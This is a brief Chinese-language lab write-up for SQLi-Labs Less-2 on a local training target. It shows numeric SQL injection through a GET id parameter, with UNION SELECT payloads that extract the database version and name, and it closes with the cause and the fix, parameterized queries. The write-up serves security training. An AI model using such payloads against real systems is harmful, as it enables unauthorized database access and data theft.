# SQLi-Labs | Less-2 GET 数字型 报错注入
## 一、漏洞简介
GET传参id，数字型注入，参数没有引号包裹，可联合查询脱库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-2/?id=1
## 三、复现步骤
1. ?id=1' 报错，报错信息无引号，判定数字型
2. order by判断列数，3列
3. 联合查询：?id=-1 union select 1,2,3 --+
## 四、Payload
?id=-1 union select 1,version(),database() --+
## 五、漏洞原理
后端SQL：`SELECT * FROM users WHERE id=$id LIMIT 0,1`，直接拼接数字参数。
## 六、修复方案
参数化查询，类型强校验。
## 七、总结
数字型注入不需要单引号闭合，直接拼接注入语句。